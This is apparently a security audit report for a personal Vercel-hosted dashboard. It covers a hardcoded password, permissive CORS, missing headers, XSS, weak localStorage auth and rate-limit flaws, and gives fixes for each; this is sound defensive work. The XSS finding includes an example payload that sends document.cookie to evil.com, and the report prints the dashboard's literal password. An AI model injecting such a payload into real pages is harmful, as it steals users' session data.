# Security Audit Report — 777 Command Center
**Auditor**: security-auditor
**Date**: 2026-03-21
**Scope**: index.html, api/chat.js, api/edit.js, vercel.json, data.json
**Deployment target**: Vercel (serverless functions + static assets)

---

## Executive Summary

Overall posture: **MODERATE RISK** for a private single-user dashboard.
The application is not publicly advertised and the data is personal-performance telemetry with no PII beyond the owner's name. The Anthropic API key is properly server-side only. The main risk surface is the hardcoded password combined with the absence of security headers — an attacker who discovers the URL can brute-force or read the password out of the minified JS within seconds.

| Severity  | Count |
|-----------|-------|
| HIGH      | 3     |
| MEDIUM    | 4     |
| LOW       | 2     |

---

## Findings

---

### [HIGH-001] Password Hardcoded in Client-Side JavaScript

**Files**: `index.html` line 2009, `api/edit.js` line 36
**CVSS estimate**: 7.5

**Evidence**:
```js
// index.html:2009
const PASSWORD = '777grind';

// api/edit.js:36
const DASHBOARD_PASSWORD = '777grind';
```

**Impact**: Any user who views the page source or opens browser DevTools can read the literal password in under five seconds. The gate provides no real protection against a determined observer. Once the password is known, the edit API is also fully open because it uses the same credential.

**Recommended fix**:
1. Server-side session cookie approach (Vercel Edge Middleware can verify a password hash and set a `HttpOnly; Secure; SameSite=Strict` cookie before serving the HTML).
2. For lower-effort hardening without changing the architecture: move the comparison out of `index.html` into a separate `/api/auth` endpoint that issues a short-lived JWT or opaque token. Store the password as an environment variable (`DASHBOARD_PASSWORD`). Never ship the secret to the browser.
3. The `api/edit.js` DASHBOARD_PASSWORD must similarly move to `process.env.DASHBOARD_PASSWORD` — it is already on the server side so the exposure is lower, but the constant value still appears in source if the function source is ever readable.

---

### [HIGH-002] Password Sent Over the Network in Plain JSON on Every Edit

**File**: `index.html` lines 3283-3295
**CVSS estimate**: 7.3

**Evidence**:
```js
body: JSON.stringify({
  password: '777grind',   // literal secret in every POST body
  table: 'daily_scores',
  ...
})
```

**Impact**: Every toggle of a daily score checkbox transmits the dashboard password as a plaintext JSON field. If the site is ever proxied, logged by an intermediary, or the browser network log is shared (e.g. in a bug report), the credential is exposed. Vercel uses HTTPS so transit is encrypted, but the credential is still present in every request body, server access logs, and browser DevTools Network tab.

**Recommended fix**: Issue a session token at login (see HIGH-001 fix) and send that token instead. The API validates the session token, not a raw password.

---

### [HIGH-003] Overly Permissive CORS in chat.js — All *.vercel.app Origins Accepted

**File**: `api/chat.js` lines 147-149
**CVSS estimate**: 7.1

**Evidence**:
```js
// Allow all *.vercel.app for preview deploys of this project
if (origin.endsWith('.vercel.app')) return true;
```

**Impact**: There are millions of Vercel deployments. Any of them can make credentialed cross-origin POST requests to `/api/chat` and consume Anthropic API tokens. A malicious actor who deploys any app on Vercel can call your AI proxy at no cost to themselves. This is effectively an open proxy with only rate limiting as a defense.

**Recommended fix**:
Option A (strictest): Remove the wildcard and enumerate allowed preview URLs:
```js
const ALLOWED_ORIGIN_PATTERN = /^https:\/\/777-command-center(-[a-z0-9]+)?\.vercel\.app$/;
if (ALLOWED_ORIGIN_PATTERN.test(origin)) return true;
```
Option B (simple): Remove the wildcard entirely and use only the production URL. Preview deployments can be tested by temporarily adding their specific URL to `ALLOWED_ORIGINS`.

Note: CORS headers are client-enforced by browsers. A server-side secret or API key stored in a cookie would provide real auth.

---

### [MEDIUM-001] No Security Headers on Any Response (No CSP, X-Frame-Options, HSTS, etc.)

**File**: `vercel.json` (absent from headers config)
**CVSS estimate**: 5.4

**Impact**: The absence of a Content-Security-Policy means:
- Any injected script (via data.json XSS vectors described in MEDIUM-002) executes without restriction.
- The dashboard can be framed by any third-party page (clickjacking).
- Browsers do not enforce HTTPS-only (`Strict-Transport-Security`).
- MIME-sniffing attacks are possible (`X-Content-Type-Options`).

**Recommended fix** — add to `vercel.json`:
```json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        { "key": "X-Frame-Options", "value": "DENY" },
        { "key": "X-Content-Type-Options", "value": "nosniff" },
        { "key": "Referrer-Policy", "value": "no-referrer" },
        { "key": "Strict-Transport-Security", "value": "max-age=63072000; includeSubDomains" },
        { "key": "Content-Security-Policy", "value": "default-src 'self'; script-src 'self' https://cdn.jsdelivr.net 'unsafe-inline'; connect-src 'self' https://api.anthropic.com; font-src 'self' https://fonts.gstatic.com; style-src 'self' https://fonts.googleapis.com 'unsafe-inline'; img-src 'self' data:" }
      ]
    }
  ]
}
```
The `unsafe-inline` in the CSP is required by the large inline `<script>` block in index.html; refactoring to an external script would allow removing it.

---

### [MEDIUM-002] XSS via Unsanitized data.json Fields Injected into innerHTML

**File**: `index.html` — multiple locations
**CVSS estimate**: 5.0

**Impact**: Several fields from `data.json` are interpolated directly into `innerHTML` template literals without HTML-escaping. If an attacker can control `data.json` content (e.g. via SSRF against the Google Sheets sync source, or by directly modifying the file), they can inject arbitrary HTML/JavaScript.

Affected interpolation sites:
- Line 2701: `${f.detail}` (seven_fs detail text)
- Line 2742: `${g.text}` (goals text)
- Line 2830: `${t.text}` (proof wall recent tasks)
- Line 3045: `${c.name}`, `${c.role}` (contacts)
- Line 3061-3062: `${e.who}`, `${e.text}` (eulogies)

Example: if `data.json` contains `"text": "<img src=x onerror=fetch('https://evil.com/'+document.cookie)>"` in the proof_wall, it would execute.

The `q.label` field at line 3324 is partially protected (double-quote escaping for the `title` attribute) but the text content is still raw.

**Recommended fix**: Use `textContent` instead of `innerHTML` for text fields, or apply an HTML-escape function before interpolation:
```js
function escHtml(str) {
  return String(str)
    .replace(/&/g,'&amp;')
    .replace(/</g,'&lt;')
    .replace(/>/g,'&gt;')
    .replace(/"/g,'&quot;')
    .replace(/'/g,'&#39;');
}
// then: item.innerHTML = `<div>${escHtml(c.name)}</div>`;
```

**Mitigating factor**: `data.json` is served as a static Vercel asset. An attacker would need write access to the deployment to modify it. Risk is low in practice but would become HIGH if the Google Sheets → data.json sync pipeline is ever compromised.

---

### [MEDIUM-003] localStorage Used as Sole Auth Token (Persistent Unlock)

**File**: `index.html` lines 2019, 2279
**CVSS estimate**: 4.8

**Evidence**:
```js
// Set on login:
localStorage.setItem('777_unlocked', '1');

// Check on page load:
if (localStorage.getItem('777_unlocked') === '1') { /* skip gate */ }
```

**Impact**: The "auth state" is a single bit with no expiry, no cryptographic integrity, and no server validation. Any JavaScript running on the same origin (including browser extensions, injected ads, or XSS) can set `localStorage.setItem('777_unlocked','1')` and bypass the gate. The dashboard never expires a session.

**Recommended fix**: If keeping localStorage as the mechanism, at minimum store a server-issued token (e.g. a JWT with an expiry) rather than a flag bit. Without a server component issuing secrets this is fundamentally unverifiable client-side auth.

---

### [MEDIUM-004] In-Memory Rate Limiting Resets on Every Cold Start

**Files**: `api/chat.js` lines 29-30, `api/edit.js` lines 57-58
**CVSS estimate**: 4.3

**Evidence**:
```js
// In-memory rate limit store (resets per cold start — sufficient for serverless)
const rateLimitStore = new Map();
```

**Impact**: Vercel serverless functions spin up a new instance per burst of traffic or after idle. Each cold start resets the rate limit map, meaning an attacker can exhaust the Anthropic API budget by repeatedly triggering cold starts (e.g. by spacing requests ~30 seconds apart to force new instances). The comment acknowledges this but characterizes it as acceptable.

**Recommended fix**: For budget protection, use Vercel KV (Redis-compatible) or Upstash Redis for a shared rate limit store that persists across cold starts. Alternatively, set a hard Anthropic API usage cap in the Anthropic console. This is a defense-in-depth gap, not a critical flaw.

---

### [LOW-001] data.json Served Publicly — No Access Control

**File**: `vercel.json` headers config (publicly accessible path)
**CVSS estimate**: 3.1

**Impact**: `data.json` is a static Vercel asset with no authentication requirement. Anyone who knows (or guesses) the URL can retrieve the full dashboard data: financial figures (`net_worth`, `the_number`), personal 7 F's scores, goals, contact relationship data, and eulogy text. The password gate is client-side only — it never protects the raw data file.

**Recommended fix**: Either serve `data.json` through a serverless function that validates a session token before returning the data, or use Vercel's Access Control (available on Pro/Enterprise) to password-protect the entire deployment at the Vercel edge layer.

---

### [LOW-002] X-Forwarded-For IP Spoofing Allows Rate Limit Bypass

**Files**: `api/chat.js` line 181, `api/edit.js` line 160
**CVSS estimate**: 3.7

**Evidence**:
```js
const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || ...
```

**Impact**: `x-forwarded-for` is a client-supplied header. On Vercel, the platform prepends the real client IP, but the code trusts the first value in the comma-separated list. An attacker sending `X-Forwarded-For: 1.2.3.4, realip` would be rate-limited against `1.2.3.4` — a spoofed address. This allows trivial rate limit bypass.

**Recommended fix**: On Vercel, use the last IP in the `x-forwarded-for` chain (which Vercel appends and cannot be spoofed by the client), or use `req.headers['x-real-ip']` which Vercel sets from the actual client address:
```js
const ip = req.headers['x-real-ip']
        || req.headers['x-forwarded-for']?.split(',').pop()?.trim()
        || 'unknown';
```

---

## Security Controls Summary

| Control | Status | Notes |
|---------|--------|-------|
| API key server-side only | PASS | Anthropic key in env var, never in client code |
| HTTPS enforced | PASS | Vercel default; add HSTS header for completeness |
| POST-only on write endpoints | PASS | Both APIs enforce method |
| Input whitelisting (table, field) | PASS | edit.js uses Set-based whitelist |
| Message depth/length limits | PASS | chat.js caps at 10 turns / 2000 chars |
| Path traversal prevention | PASS | edit.js writes to fixed path only |
| Password never logged | PASS | edit.js logs table/key/field but not password |
| Password in client JS | FAIL | HIGH-001 |
| Password in every request body | FAIL | HIGH-002 |
| CORS wildcard *.vercel.app | FAIL | HIGH-003 |
| Security headers (CSP/XFO/HSTS) | FAIL | MEDIUM-001 |
| HTML sanitization of data.json fields | PARTIAL | MEDIUM-002 |
| Rate limiting persistence | FAIL | MEDIUM-004 |
| data.json access control | FAIL | LOW-001 |

---

## Prioritized Remediation Roadmap

**P0 — Do immediately (before sharing the URL with anyone)**
1. Move password to `process.env.DASHBOARD_PASSWORD` and issue a session token from `/api/auth`. Remove the hardcoded string from both files. (Fixes HIGH-001, HIGH-002)
2. Add security headers to `vercel.json`. (Fixes MEDIUM-001 — 5 min change)
3. Restrict CORS to a specific project regex, not all of `.vercel.app`. (Fixes HIGH-003)

**P1 — Before any public or client demo**
4. HTML-escape data.json fields before innerHTML injection, or migrate to textContent. (Fixes MEDIUM-002)
5. Fix X-Forwarded-For to use `x-real-ip` or the last value. (Fixes LOW-002)

**P2 — Nice to have**
6. Move data.json behind a serverless function that validates a session cookie. (Fixes LOW-001)
7. Replace in-memory rate limit Map with Vercel KV or Upstash Redis. (Fixes MEDIUM-003, MEDIUM-004)
8. Set a hard spend cap in the Anthropic console as a backup to rate limiting.

---

## Notes on Scope

- `data.json` contains no secrets in the current sample file. If real financial data (`net_worth`, `the_number`) is populated, LOW-001 becomes a MEDIUM.
- The Anthropic API key exposure risk is LOW given it lives only in `process.env` and is never forwarded to the client. No client-side leakage was found.
- The `pending-edits.json` file write in `edit.js` is safe against path traversal — the path is `resolve(__dirname, '..', 'pending-edits.json')`, a fixed absolute path with no user input involved.
- `data.json` exposes personal relationship data (contact names, roles, days since last contact, eulogy intentions). This is sensitive life-data even if not financial. See LOW-001.
